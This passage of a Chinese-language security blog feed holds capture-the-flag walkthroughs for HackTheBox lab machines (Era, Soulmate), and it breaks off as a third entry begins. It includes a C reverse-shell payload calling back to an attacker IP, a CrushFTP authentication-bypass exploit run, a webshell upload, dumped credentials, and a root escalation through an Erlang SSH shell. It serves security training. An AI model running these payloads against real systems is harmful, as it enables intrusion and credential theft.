class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>wget <span class="hljs-number">10.10</span>.<span class="hljs-number">16.20</span>/pwn.c<br>--<span class="hljs-number">2025</span>-<span class="hljs-number">11</span>-<span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span>--  <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/10.10.16.20/pwn</span>.c<br><span class="hljs-title class_">Connecting</span> to <span class="hljs-number">10.10</span>.<span class="hljs-number">16.20</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span>... connected.<br><span class="hljs-variable constant_">HTTP</span> request sent, awaiting response... <span class="hljs-number">200</span> <span class="hljs-variable constant_">OK</span><br><span class="hljs-title class_">Length</span>: <span class="hljs-number">101</span> [text/x-csrc]<br><span class="hljs-title class_">Saving</span> <span class="hljs-symbol">to:</span> â€˜pwn.câ€™<br><br>pwn.c                                  <span class="hljs-number">100</span><span class="hljs-string">%[============================================================================&gt;]</span>     <span class="hljs-number">101</span>  --.-<span class="hljs-variable constant_">KB</span>/s    <span class="hljs-keyword">in</span> 0s      <br><br><span class="hljs-number">2025</span>-<span class="hljs-number">11</span>-<span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span> (<span class="hljs-number">12.9</span> <span class="hljs-variable constant_">MB</span>/s) - â€˜pwn.câ€™ saved [<span class="hljs-number">101</span>/<span class="hljs-number">101</span>]<br><br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>gcc pwn.c -o pwn<br>pwn.<span class="hljs-symbol">c:</span> <span class="hljs-title class_">In</span> function â€˜mainâ€™:<br>pwn.<span class="hljs-symbol">c:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>: <span class="hljs-symbol">warning:</span> implicit declaration of function â€˜systemâ€™ [-<span class="hljs-title class_">Wimplicit</span>-function-declaration]<br>    <span class="hljs-number">2</span> |<span class="hljs-params">     system(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.20/9999 0&gt;&amp;1&#x27;&quot;);</span><br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>objcopy --dump-section .text_sig=text_sig /opt/<span class="hljs-title class_">AV</span>/periodic-checks/monitor<br><span class="hljs-symbol">objcopy:</span> unable to copy file <span class="hljs-string">&#x27;/opt/AV/periodic-checks/monitor&#x27;</span>; <span class="hljs-symbol">reason:</span> <span class="hljs-title class_">Text</span> file busy<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>objcopy --dump-section .text_sig=text_sig /opt/<span class="hljs-title class_">AV</span>/periodic-checks/monitor<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>objcopy --add-section .text_sig=text_sig pwn<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>cp pwn monitor <br><br></code></pre></td></tr></table></figure><p><img src="/2025/11/17/HackTheBox-Era/vmware_nclwVDriJa.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox-Soulmate</title>
    <link href="/2025/11/17/HackTheBox-Soulmate/"/>
    <url>/2025/11/17/HackTheBox-Soulmate/</url>
    
    <content type="html"><![CDATA[<p>æ±¡æ³¥å•Š è¡€è‚‰å•Š<br>çŸ³å¤´å’Œå¤§åœ°ä¹Ÿæ˜¯ä½ å•Š<br>è«è¦å“­ è«è¦æ€•<br>èµ°è¿‡äº†ä¸œè·¯å°±åˆ°å®¶</p><hr><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">./rustscan -a 10.10.11.86<br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;<span class="hljs-emphasis">__ &#123;_   _&#125;&#123; &#123;__</span>  /  <span class="hljs-emphasis">___&#125; / &#123;&#125; \ |  `| |</span><br><span class="hljs-emphasis">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="hljs-emphasis">`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br><span class="hljs-emphasis">The Modern Day Port Scanner.</span><br><span class="hljs-emphasis">__</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span>___<br><span class="hljs-meta">: http://discord.skerritt.blog</span>         :<br><span class="hljs-meta">: https://github.com/RustScan/RustScan</span> :<br><span class="hljs-code"> --------------------------------------</span><br>RustScan: Because guessing isn&#x27;t hacking.<br><br>[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;<br>[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers<br>[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with <span class="hljs-emphasis">&#x27;--ulimit 5000&#x27;</span>. <br>Open 10.10.11.86:22<br>Open 10.10.11.86:80<br>[~] Starting Script(s)<br>[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-16 19:32 EST<br>Initiating Ping Scan at 19:32<br>Scanning 10.10.11.86 [4 ports]<br>Completed Ping Scan at 19:32, 0.10s elapsed (1 total hosts)<br>Initiating SYN Stealth Scan at 19:32<br>Scanning soulmate.htb (10.10.11.86) [2 ports]<br>Discovered open port 80/tcp on 10.10.11.86<br>Discovered open port 22/tcp on 10.10.11.86<br>Completed SYN Stealth Scan at 19:32, 0.15s elapsed (2 total ports)<br>Nmap scan report for soulmate.htb (10.10.11.86)<br>Host is up, received echo-reply ttl 63 (0.099s latency).<br>Scanned at 2025-11-16 19:32:18 EST for 0s<br><br>PORT   STATE SERVICE REASON<br>22/tcp open  ssh     syn-ack ttl 63<br>80/tcp open  http    syn-ack ttl 63<br><br>Read data files from: /usr/share/nmap<br>Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds<br><span class="hljs-code">           Raw packets sent: 6 (240B) | Rcvd: 6 (236B)</span><br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section"> gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://soulmate.htb/ -t 30 --append-domain</span><br><span class="hljs-section">===============================================================</span><br>Gobuster v3.6<br><span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="hljs-section">===============================================================</span><br>[+] Url:             http://soulmate.htb/<br>[+] Method:          GET<br>[+] Threads:         30<br>[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br>[+] User Agent:      gobuster/3.6<br>[+] Timeout:         10s<br>[+] Append Domain:   true<br>===============================================================<br>Starting gobuster in VHOST enumeration mode<br>===============================================================<br>Found: ftp.soulmate.htb Status: 302 [Size: 0] [--&gt; /WebInterface/login.html]<br><br></code></pre></td></tr></table></figure><p>è®¿é—®å­åŸŸåå‘ç°æ˜¯curshFTPçš„ç™»å½•ç•Œé¢ã€‚</p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p>æœç´¢å¯¹åº”expï¼Œæ·»åŠ ä»»æ„ç”¨æˆ·</p><p><a href="https://github.com/Immersive-Labs-Sec/CVE-2025-31161">Immersive-Labs-Sec&#x2F;CVE-2025-31161: Proof of Concept for CVE-2025-31161 &#x2F; CVE-2025-2825</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python cve-<span class="hljs-number">2025</span>-<span class="hljs-number">31161</span><span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target_host</span> ftp<span class="hljs-selector-class">.soulmate</span><span class="hljs-selector-class">.htb</span> <span class="hljs-attr">--port</span> <span class="hljs-number">80</span> <span class="hljs-attr">--target_user</span> root <span class="hljs-attr">--new_user</span> kaada <span class="hljs-attr">--password</span> <span class="hljs-number">123456</span> <br><span class="hljs-selector-attr">[+]</span> Preparing Payloads<br>  <span class="hljs-selector-attr">[-]</span> Warming up the target<br>  <span class="hljs-selector-attr">[-]</span> Target is up and running<br><span class="hljs-selector-attr">[+]</span> Sending Account Create Request<br>  <span class="hljs-selector-attr">[!]</span> User created successfully<br><span class="hljs-selector-attr">[+]</span> Exploit Complete you can now login with<br>   <span class="hljs-selector-attr">[*]</span> Username: kaada<br>   <span class="hljs-selector-attr">[*]</span> Password: <span class="hljs-number">123456</span>.<br>                             <br></code></pre></td></tr></table></figure><p>ç™»å½•ä¹‹åè®¿é—®ç®¡ç†å‘˜ç•Œé¢ï¼Œå¯ä»¥ä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„å¯†ç ã€‚</p><p><img src="/2025/11/17/HackTheBox-Soulmate/cloudmusic_mGoRJHO9QJ.png"></p><p>benç”¨æˆ·å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚</p><p><img src="/2025/11/17/HackTheBox-Soulmate/vmware_xqFYOSHsQm.png"></p><p>å®é™…ä¸Šè¿™é‡Œå¯¹åº”çš„æ˜¯soulhtbçš„ä¸»ç›®å½•ï¼Œä¸Šä¼ ä¸€å¥è¯é©¬å¼¹shellã€‚</p><p><img src="/2025/11/17/HackTheBox-Soulmate/vmware_75V3KEGVdL.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">â¤  ğŸ  <span class="hljs-selector-tag">Main</span> <span class="hljs-selector-tag">Menu</span> (m) ğŸ’€ Payloads (<span class="hljs-selector-tag">p</span>) ğŸ”„ <span class="hljs-attribute">Clear</span> (Ctrl-L) ğŸš« Quit (<span class="hljs-selector-tag">q</span>/Ctrl-C)<br><span class="hljs-selector-attr">[+]</span> Got reverse shell <span class="hljs-selector-tag">from</span> soulmate-<span class="hljs-number">10.10</span>.<span class="hljs-number">11.86</span>-Linux-x86_64 ğŸ˜ Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;<br><span class="hljs-selector-attr">[+]</span> Attempting <span class="hljs-selector-tag">to</span> upgrade shell <span class="hljs-selector-tag">to</span> PTY...<br><span class="hljs-selector-attr">[+]</span> Shell upgraded successfully using /usr/bin/python3! ğŸ’ª<br><span class="hljs-selector-attr">[+]</span> Interacting with session <span class="hljs-selector-attr">[1]</span>, Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/soulmate~<span class="hljs-number">10.10</span>.<span class="hljs-number">11.86</span>_Linux_x86_64/<span class="hljs-number">2025</span>_11_16-<span class="hljs-number">19</span>_42_50-<span class="hljs-number">664</span>.log ğŸ“œ<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>www-data@soulmate:~/soulmate.htb/public$ <br><br></code></pre></td></tr></table></figure><p>ç½‘ç«™æ ¹ç›®å½•ä¸‹å¾—åˆ°ç®¡ç†å‘˜å¯†ç å“ˆå¸Œ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">www</span>-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db <br><span class="hljs-attribute">SQLite</span> version <span class="hljs-number">3</span>.<span class="hljs-number">37</span>.<span class="hljs-number">2</span> <span class="hljs-number">2022</span>-<span class="hljs-number">01</span>-<span class="hljs-number">06</span> <span class="hljs-number">13</span>:<span class="hljs-number">25</span>:<span class="hljs-number">41</span><br><span class="hljs-attribute">Enter</span> <span class="hljs-string">&quot;.help&quot;</span> for usage hints.<br><span class="hljs-attribute">sqlite</span>&gt; .tables<br><span class="hljs-attribute">users</span><br><span class="hljs-attribute">sqlite</span>&gt; select * from users;<br><span class="hljs-attribute">1</span>|admin|$<span class="hljs-number">2</span>y$<span class="hljs-number">12</span>$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2|<span class="hljs-number">1</span>|Administrator|||||<span class="hljs-number">2025</span>-<span class="hljs-number">08</span>-<span class="hljs-number">10</span> <span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">08</span>|<span class="hljs-number">2025</span>-<span class="hljs-number">08</span>-<span class="hljs-number">10</span> <span class="hljs-number">12</span>:<span class="hljs-number">59</span>:<span class="hljs-number">39</span><br><span class="hljs-attribute">sqlite</span>&gt; <br></code></pre></td></tr></table></figure><p>ä½†æ˜¯çˆ†ç ´ä¸å‡ºæ¥ã€‚</p><h3 id="GetBen"><a href="#GetBen" class="headerlink" title="GetBen"></a>GetBen</h3><hr><p>ä¸Šä¼ linpeasè¿›ä¸€æ­¥åˆ†æï¼Œå‘ç°rootç”¨æˆ·æ‰§è¡Œäº†ä¸€ä¸ªè‡ªå®šä¹‰è„šæœ¬ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>        <span class="hljs-number">1076</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">1</span>.<span class="hljs-number">4</span> <span class="hljs-number">2253504</span> <span class="hljs-number">57000</span> ?       Ssl  Nov16   <span class="hljs-number">0</span>:<span class="hljs-number">09</span> /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-<span class="hljs-number">15</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface &#123;<span class="hljs-number">127</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125; -- -extra /usr/local/lib/erlang_login/start.escript<br><br></code></pre></td></tr></table></figure><p>å…¶ä¸­å¾—åˆ°benç”¨æˆ·å¯†ç </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">www-data@soulmate:~/soulmate.htb/<span class="hljs-built_in">public</span>$ cat /usr/<span class="hljs-keyword">local</span>/lib/erlang_login/<span class="hljs-keyword">start</span>.escript<br>#!/usr/bin/env escript<br>%%! -sname ssh_runner<br><br>main(_) -&gt;<br>    application:<span class="hljs-keyword">start</span>(asn1),<br>    application:<span class="hljs-keyword">start</span>(crypto),<br>    application:<span class="hljs-keyword">start</span>(public_key),<br>    application:<span class="hljs-keyword">start</span>(ssh),<br><br>    io:format(&quot;Starting SSH daemon with logging...~n&quot;),<br><br>    <span class="hljs-keyword">case</span> ssh:daemon(<span class="hljs-number">2222</span>, [<br>        &#123;ip, &#123;<span class="hljs-number">127</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;&#125;,<br>        &#123;system_dir, &quot;/etc/ssh&quot;&#125;,<br><br>        &#123;user_dir_fun, fun(<span class="hljs-keyword">User</span>) -&gt;<br>            Dir = filename:<span class="hljs-keyword">join</span>(&quot;/home&quot;, <span class="hljs-keyword">User</span>),<br>            io:format(&quot;Resolving user_dir for ~p: ~s/.ssh~n&quot;, [<span class="hljs-keyword">User</span>, Dir]),<br>            filename:<span class="hljs-keyword">join</span>(Dir, &quot;.ssh&quot;)<br>        <span class="hljs-keyword">end</span>&#125;,<br><br>        &#123;connectfun, fun(<span class="hljs-keyword">User</span>, PeerAddr, <span class="hljs-keyword">Method</span>) -&gt;<br>            io:format(&quot;Auth success for user: ~p from ~p via ~p~n&quot;,<br>                      [<span class="hljs-keyword">User</span>, PeerAddr, <span class="hljs-keyword">Method</span>]),<br>            <span class="hljs-keyword">true</span><br>        <span class="hljs-keyword">end</span>&#125;,<br><br>        &#123;failfun, fun(<span class="hljs-keyword">User</span>, PeerAddr, Reason) -&gt;<br>            io:format(&quot;Auth failed for user: ~p from ~p, reason: ~p~n&quot;,<br>                      [<span class="hljs-keyword">User</span>, PeerAddr, Reason]),<br>            <span class="hljs-keyword">true</span><br>        <span class="hljs-keyword">end</span>&#125;,<br><br>        &#123;auth_methods, &quot;publickey,password&quot;&#125;,<br><br>        &#123;user_passwords, [&#123;&quot;ben&quot;, &quot;HouseH0ldings998&quot;&#125;]&#125;,<br>        &#123;idle_time, <span class="hljs-keyword">infinity</span>&#125;,<br>        &#123;max_channels, <span class="hljs-number">10</span>&#125;,<br>        &#123;max_sessions, <span class="hljs-number">10</span>&#125;,<br>        &#123;parallel_login, <span class="hljs-keyword">true</span>&#125;<br>    ]) <span class="hljs-keyword">of</span><br>        &#123;ok, _Pid&#125; -&gt;<br>            io:format(&quot;SSH daemon running on port 2222. Press Ctrl+C to exit.~n&quot;);<br>        &#123;error, Reason&#125; -&gt;<br>            io:format(&quot;Failed to start SSH daemon: ~p~n&quot;, [Reason])<br>    <span class="hljs-keyword">end</span>,<br><br>    receive<br>        stop -&gt; ok<br>    <span class="hljs-keyword">end</span>.<br><br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>æŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°åŸºäºerlangçš„sshæœåŠ¡ï¼Œæ˜¯rootå¼€å¯çš„</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">00</span>:<span class="hljs-number">34</span>:<span class="hljs-number">06</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">1076</span>   | /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-<span class="hljs-number">15</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface &#123;<span class="hljs-number">127</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125; -- -extra /usr/local/lib/erlang_login/start.escript  <br></code></pre></td></tr></table></figure><p>å¼€æ”¾ç«¯å£ä¸º2222</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">ben@soulmate:~$ ssh -p <span class="hljs-number">2222</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-comment">&#x27;[127.0.0.1]:2222 ([127.0.0.1]:2222)&#x27; can&#x27;t be established.</span><br>ED25519 <span class="hljs-keyword">key</span> fingerprint <span class="hljs-built_in">is</span> SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.<br>This host <span class="hljs-keyword">key</span> <span class="hljs-built_in">is</span> known <span class="hljs-keyword">by</span> the following other names/addresses:<br>    ~/.ssh/known_hosts:<span class="hljs-number">1</span>: [hashed name]<br>Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> connecting (yes/no/[fingerprint])? yes<br><span class="hljs-symbol">Warning:</span> Permanently added <span class="hljs-comment">&#x27;[127.0.0.1]:2222&#x27; (ED25519) to the list of known hosts.</span><br>ben@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">&#x27;s password: </span><br>Eshell V15.<span class="hljs-number">2.5</span> (press Ctrl+G <span class="hljs-keyword">to</span> abort, type help(). <span class="hljs-keyword">for</span> help)<br>(ssh_runner@soulmate)<span class="hljs-number">1</span>&gt; <br><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">(ssh_runner@soulmate)<span class="hljs-number">1</span>&gt; m().<br>Module                <span class="hljs-keyword">File</span><br>application           <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>erlang<span class="hljs-regexp">/lib/</span>kernel-<span class="hljs-number">10.2</span>.<span class="hljs-number">5</span><span class="hljs-regexp">/ebin/</span>application.beam<br>application_controll  <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>erlang<span class="hljs-regexp">/lib/</span>kernel-<span class="hljs-number">10.2</span>.<span class="hljs-number">5</span><span class="hljs-regexp">/ebin/</span>application_controller.beam<br>application_master    <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>erlang<span class="hljs-regexp">/lib/</span>kernel-<span class="hljs-number">10.2</span>.<span class="hljs-number">5</span><span class="hljs-regexp">/ebin/</span>application_master.beam<br>atomics               preloaded<br>...<br>os                    <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>erlang<span class="hljs-regexp">/lib/</span>kernel-<span class="hljs-number">10.2</span>.<span class="hljs-number">5</span><span class="hljs-regexp">/ebin/</span>os.beam<br><br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">(ssh_runner<span class="hljs-meta">@soulmate</span>)<span class="hljs-number">2</span><span class="hljs-operator">&gt;</span> os:cmd(<span class="hljs-string">&quot;id&quot;</span>).<br>(ssh_runner<span class="hljs-meta">@soulmate</span>)<span class="hljs-number">2</span><span class="hljs-operator">&gt;</span> os:cmd(<span class="hljs-string">&quot;id&quot;</span>).<br><span class="hljs-string">&quot;uid=0(root) gid=0(root) groups=0(root)<span class="hljs-subst">\n</span>&quot;</span><br>(ssh_runner<span class="hljs-meta">@soulmate</span>)<span class="hljs-number">3</span><span class="hljs-operator">&gt;</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackmyVm-babyshell</title>
    <link href="/2025/11/09/HackmyVm-babyshell/"/>
    <url>/2025/11/09/HackmyVm-babyshell/</url>
    
    <content type="html"><![CDATA[<p>å‘œå‘œå‘œæˆ‘çš„é¦–æ€â€¦.</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ./rustscan -a 192.168.56.186<br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |<br>`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;<br>The Modern Day Port Scanner.<br>________________________________________<br>: http://discord.skerritt.blog         :<br>: https://github.com/RustScan/RustScan :<br> --------------------------------------<br>Breaking and entering... into the world of open ports.<br><br>[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;<br>[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers<br>[!] Your file limit is very small, which negatively 